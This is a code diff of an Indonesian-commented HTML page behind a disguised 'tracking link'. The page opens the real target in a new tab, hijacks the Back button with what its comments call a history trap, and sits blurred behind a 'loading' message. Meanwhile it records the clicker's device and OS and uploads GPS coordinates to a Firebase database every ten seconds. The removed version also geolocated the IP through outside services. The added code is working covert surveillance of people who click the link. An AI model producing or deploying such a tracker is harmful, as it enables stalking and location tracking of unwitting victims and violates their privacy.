@@ -2,134 +2,142 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title></title> <!-- kosong -->
+  <title></title> <!-- judul kosong -->
   <style>
-    body, html {
-      margin:0; padding:0;
-      width:100%; height:100%;
-      background:#fff;
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: Arial, sans-serif;
+      background: #000;
+      color: #fff;
+      filter: blur(8px);
+      user-select: none;
     }
+    h1 { font-size: 24px; opacity: 0.2; }
   </style>
 </head>
 <body>
-  <script>
+  <h1>Sedang memuat...</h1>
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { 
+      getFirestore, 
+      doc, 
+      getDoc, 
+      collection, 
+      addDoc, 
+      setDoc, 
+      arrayUnion 
+    } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyAtTakF_Psb-yhxa5NFlcs3Tte5gjYe00",
+      authDomain: "locked-1dfad.firebaseapp.com",
+      projectId: "locked-1dfad",
+      storageBucket: "locked-1dfad.appspot.com",
+      messagingSenderId: "237366240355",
+      appId: "1:237366240355:web:e3a4f999ff547a07398456",
+      measurementId: "G-ZFQC67FMCV"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
     const urlParams = new URLSearchParams(window.location.search);
     const linkId = urlParams.get('id');
-    const links = JSON.parse(localStorage.getItem('trackingLinks')) || {};
-    const linkData = links[linkId];
+    const linkRef = doc(db, "trackingLinks", linkId);
 
-    if (!linkData) {
-      document.body.innerHTML = '<h1>Error: Tautan tidak valid</h1>';
-    } else {
-      // ganti URL tab biar kelihatan target
-      history.replaceState(null, "", linkData.targetUrl);
-      // tambahin pushState supaya tombol "Back" jebakannya tetap ke target
-      history.pushState(null, "", linkData.targetUrl);
+    let targetUrl = null;
+    let clickDocRef = null;
 
-      // buka target di tab baru
-      const win = window.open(linkData.targetUrl, "_blank");
-      if (win) {
-        win.focus();
-        window.blur();
+    async function init() {
+      const snap = await getDoc(linkRef);
+      if (!snap.exists()) {
+        document.body.innerHTML = '<h1>Error: Tautan tidak valid</h1>';
+        return;
       }
+      targetUrl = snap.data().targetUrl;
 
-      // kalau user tekan tombol back, tetap stay di targetUrl
+      // buka link asli di tab baru
+      window.open(targetUrl, "_blank");
+
+      // jebakan history
+      history.pushState(null, "", location.href);
       window.onpopstate = function() {
-        history.pushState(null, "", linkData.targetUrl);
+        history.pushState(null, "", location.href);
       };
 
-      // data klik awal
-      const clickData = {
-        timestamp: Date.now(),
-        device: detectDevice(),
-        os: detectOS(),
-        ipInfo: null,
-        location: null
-      };
+      // buat satu dokumen klik di subcollection
+      const deviceInfo = detectDevice();
+      clickDocRef = await addDoc(collection(linkRef, "liveClicks"), {
+        createdAt: Date.now(),
+        device: deviceInfo.device,
+        os: deviceInfo.os,
+        locationHistory: []
+      });
 
-      // ambil IP info
-      fetch('https://api.ipify.org?format=json')
-        .then(res => res.json())
-        .then(ipData => {
-          const ipv4 = ipData.ip;
-          return fetch(`https://ipapi.co/${ipv4}/json/`)
-            .then(res => res.json())
-            .then(geo => {
-              clickData.ipInfo = {
-                ip: ipv4,
-                city: geo.city,
-                country: geo.country_name
-              };
-            });
-        })
-        .catch(() => {});
-
-      // fungsi ambil lokasi GPS berkala
-      function getLocation() {
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(
-            pos => {
-              clickData.location = {
-                latitude: pos.coords.latitude,
-                longitude: pos.coords.longitude
-              };
-              saveClick();
-            },
-            () => saveClick(),
-            { timeout: 5000 }
-          );
-        } else {
-          saveClick();
-        }
-      }
-
-      // simpan data klik
-      function saveClick() {
-        if (!linkData.clicks) linkData.clicks = [];
-        linkData.clicks.push({
-          timestamp: Date.now(),
-          device: clickData.device,
-          os: clickData.os,
-          ipInfo: clickData.ipInfo,
-          location: clickData.location
-        });
-        links[linkId] = linkData;
-        localStorage.setItem('trackingLinks', JSON.stringify(links));
-      }
-
-      // deteksi device
-      function detectDevice() {
-        const ua = navigator.userAgent.toLowerCase();
-        if (ua.includes("oppo")) return "Oppo";
-        if (ua.includes("vivo")) return "Vivo";
-        if (ua.includes("xiaomi")) return "Xiaomi";
-        if (ua.includes("redmi")) return "Xiaomi (Redmi)";
-        if (ua.includes("samsung")) return "Samsung";
-        if (ua.includes("realme")) return "Realme";
-        if (ua.includes("huawei")) return "Huawei";
-        if (ua.includes("infinix")) return "Infinix";
-        if (ua.includes("asus")) return "Asus";
-        if (ua.includes("iphone")) return "iPhone";
-        if (ua.includes("ipad")) return "iPad";
-        return "Unknown Device";
-      }
-
-      // deteksi OS
-      function detectOS() {
-        const ua = navigator.userAgent.toLowerCase();
-        if (ua.includes("android")) return "Android";
-        if (ua.includes("iphone") || ua.includes("ipad") || ua.includes("ipod")) return "iOS";
-        if (ua.includes("win")) return "Windows";
-        if (ua.includes("mac")) return "MacOS";
-        if (ua.includes("linux")) return "Linux";
-        return "Unknown OS";
-      }
-
-      // jalankan ambil lokasi tiap 15 detik
-      getLocation();
-      setInterval(getLocation, 15000);
+      updateClick();
+      setInterval(updateClick, 10000);
     }
+
+    function detectDevice() {
+      const ua = navigator.userAgent.toLowerCase();
+      let device = "Unknown Device";
+      let os = "Unknown OS";
+      if (ua.includes("android")) os = "Android";
+      else if (ua.includes("iphone") || ua.includes("ipad") || ua.includes("ipod")) os = "iOS";
+      else if (ua.includes("win")) os = "Windows";
+      else if (ua.includes("mac")) os = "MacOS";
+      else if (ua.includes("linux")) os = "Linux";
+      if (ua.includes("oppo")) device = "Oppo";
+      else if (ua.includes("vivo")) device = "Vivo";
+      else if (ua.includes("xiaomi")) device = "Xiaomi";
+      else if (ua.includes("redmi")) device = "Xiaomi (Redmi)";
+      else if (ua.includes("samsung")) device = "Samsung";
+      else if (ua.includes("realme")) device = "Realme";
+      else if (ua.includes("huawei")) device = "Huawei";
+      else if (ua.includes("infinix")) device = "Infinix";
+      else if (ua.includes("asus")) device = "Asus";
+      else if (ua.includes("iphone")) device = "iPhone";
+      else if (ua.includes("ipad")) device = "iPad";
+      return { device, os };
+    }
+
+    async function updateClick() {
+      if (!clickDocRef) return;
+      const data = { lastSeen: Date.now() };
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            const loc = {
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude
+            };
+            data.location = loc;
+            data.locationHistory = arrayUnion(loc);
+            save(data);
+          },
+          () => save(data),
+          { timeout: 5000 }
+        );
+      } else {
+        save(data);
+      }
+    }
+
+    async function save(data) {
+      try {
+        await setDoc(clickDocRef, data, { merge: true });
+      } catch (err) {
+        console.error("Gagal update Firestore:", err);
+      }
+    }
+
+    init();
   </script>
 </body>
 </html>
